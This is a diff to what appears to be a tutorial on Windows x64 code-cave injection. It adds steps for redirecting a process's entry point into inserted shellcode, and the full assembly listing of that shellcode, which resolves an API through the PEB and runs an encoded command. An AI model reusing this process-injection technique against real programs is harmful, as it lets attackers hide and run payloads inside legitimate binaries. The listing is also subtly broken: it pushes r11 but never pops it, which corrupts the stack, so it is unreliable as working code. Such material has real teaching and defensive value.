@@ -36,8 +36,7 @@ Most of the times, it's pretty easy. Just open the target process with `x64dbg` 
 ```
 You can then paste your shellcode in place of these null instructions (tutorial below).
 
-If you want, you can also use Cheat Engine's "Scan for code caves" feature:
-
+If you want, you can also use Cheat Engine's "Scan for code caves" feature (`CTRL + ALT + C` in the Memory Viewer):
 
 ![Writing our shellcode](/assets/images/injection/codecaves/scan.png)
 
@@ -222,7 +221,127 @@ unsigned char array[] = {
 };
 ```
 
-Let's write this shellcode after the initial push instructions:
+Let's write this shellcode after the initial `push` instructions:
 
 ![Writing the shellcode](/assets/images/injection/codecaves/x64shellcode1.png)
 
+After writing our shellcode, we'll pop the general purpose registers:
+
+![Popping the registers](/assets/images/injection/codecaves/pop.png)
+
+Now, we will have to jump to the start of our shellcode **from somewhere within the actual process's execution flow**.
+
+This is the starting instruction of our shellcode:
+```c
+00007FF6B14323F4 | 53                       | push rbx                                |
+```
+
+At address `00007FF6B1431408`, the Entry Point instruction is located. I will modify that instruction with a `jmp` to the start of our shellcode:
+```c
+jmp 0x00007FF6B14323F4 // this address contains the first instruction in our shellcode
+```
+
+![Jumping to the start of the shellcode](/assets/images/injection/codecaves/modification.png)
+
+At the end, we jump back to the instruction that comes right after that initial jump, so the program continues as if nothing happened.
+
+![Jump back to the instruction that comes right after that initial jump](/assets/images/injection/codecaves/jumpback.png)
+
+This is our our final shellcode looks like:
+
+```c
+push rbx // <--- manually pushing all of the general-purpose registers onto the stack (for preservation)
+push rcx
+push rdx
+push rsi
+push rdi
+push rbp
+push r8
+push r9
+push r10
+push r11
+push r12
+push r13
+push r14
+push r15 // <--- pushing ends here
+xor rdi,rdi // <--- start of shellcode!
+mul rdi
+mov rbx,qword ptr gs:[rax+60]
+mov rbx,qword ptr ds:[rbx+18]
+mov rbx,qword ptr ds:[rbx+20]
+mov rbx,qword ptr ds:[rbx]
+mov rbx,qword ptr ds:[rbx]
+mov rbx,qword ptr ds:[rbx+20]
+mov r8,rbx
+mov ebx,dword ptr ds:[rbx+3C]
+add rbx,r8
+xor rcx,rcx
+add cx,88FF
+shr rcx,8
+mov edx,dword ptr ds:[rbx+rcx]
+add rdx,r8
+xor r10,r10
+mov r10d,dword ptr ds:[rdx+1C]
+add r10,r8
+xor r11,r11
+mov r11d,dword ptr ds:[rdx+20]
+add r11,r8
+xor r12,r12
+mov r12d,dword ptr ds:[rdx+24]
+add r12,r8
+jmp cracked27 codecave.7FF601E32494
+pop rbx
+pop rcx
+xor rax,rax
+mov rdx,rsp
+push rcx
+mov rcx,qword ptr ss:[rsp]
+xor rdi,rdi
+mov edi,dword ptr ds:[r11+rax*4]
+add rdi,r8
+mov rsi,rdx
+repe cmpsb 
+je cracked27 codecave.7FF601E32485
+inc rax
+jmp cracked27 codecave.7FF601E3246B
+pop rcx
+mov ax,word ptr ds:[r12+rax*2]
+mov eax,dword ptr ds:[r10+rax*4]
+add rax,r8
+push rbx
+ret 
+xor rcx,rcx
+add cl,7
+mov rax,9C9A87BA9196A80F
+not rax
+shr rax,8
+push rax
+push rcx
+call cracked27 codecave.7FF601E32462
+mov r14,rax
+xor rcx,rcx
+mul rcx
+push rax
+mov rax,9A879AD19C939E9C
+not rax
+push rax
+mov rcx,rsp
+inc rdx
+sub rsp,20
+call r14 // <--- end of shellcode!
+pop r15 // <--- popping all the general purpose registers from the stack (to restore register state)
+pop r14
+pop r13
+pop r12
+pop r10
+pop r9
+pop r8
+pop rbp
+pop rdi
+pop rsi
+pop rdx
+pop rcx
+pop rbx
+mov qword ptr ss:[rsp+18],rbx
+jmp cracked27 codecave.7FF601E3140D // <--- Jumping back
+```
